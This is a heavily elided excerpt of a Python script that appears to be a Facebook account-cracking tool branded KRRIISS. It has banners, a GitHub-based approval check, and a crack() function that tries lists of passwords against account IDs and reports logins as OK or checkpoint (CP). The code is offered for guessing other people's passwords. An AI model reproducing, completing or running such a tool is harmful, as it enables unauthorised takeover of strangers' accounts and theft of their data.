...
\033[1;37m----------------------------------------------
 ...
 Username  : 
\033[1;37m----------------------------------------------""")
	uname = input(' [•] Name Lekh Afno : ')
	open('.name.txt','w').write(uname)
...
try:
        ...
        os.system('clear')
        print(' [×] Modules Not Found Error ')
        time.sleep(2)
        os.system('python .modules.py')
except:pass
...
def contact():
	os.system('xdg-open https://www.facebook.com/Krrisslamass')
	back()
def animation(u):
...
def approval():
  ...
  print ("""\033[1;37m----------------------------------------------""")
  try:
    httpCaht = requests.get("https://github.com/KrriissLama/krriss/blob/main/Approve.txt").text
    if id in httpCaht:
...
def menu(my_name,my_id):
	...
	if Meledak in ['1']:
		...
		banner()
		info()
		os.system('git clone https://github.com/KrriissLama')
		linex()
...
def passu():
	...
	linex()
	prints(f' >> Use NTC 4G Mobile Data For Speed Up ')
	linex()
	prog = Progress(TextColumn('\033[1;97m [KRRIISS]{task.description}'))
	...
	with prog:
		...
		linex()
	linex()
	print(' [\u001b[36m•\033[1;37m] THANKS FOR USING OUR TOOLS ')
...
def crack(idf,pwv):
	...
	fff = '%'
	prog.update(des,description=f'\r[deep_white]  {(loop)}/{len(id)} [green]OK:-{(ok)}    [yellow]CP:-{(cp)}')
	prog.advance(des)
	ses = requests.Session()
	...
	for pw in pwv:
		try:
			...
			if "checkpoint" in po.cookies.get_dict().keys():
				print(f'\u001b[33m [KRRIISS-CP] {idf}  {pw}\033[1;97m')
				...
				print(f'\033[1;32m [KRRIISS-OK] {idf}  {pw}\033[1;97m')
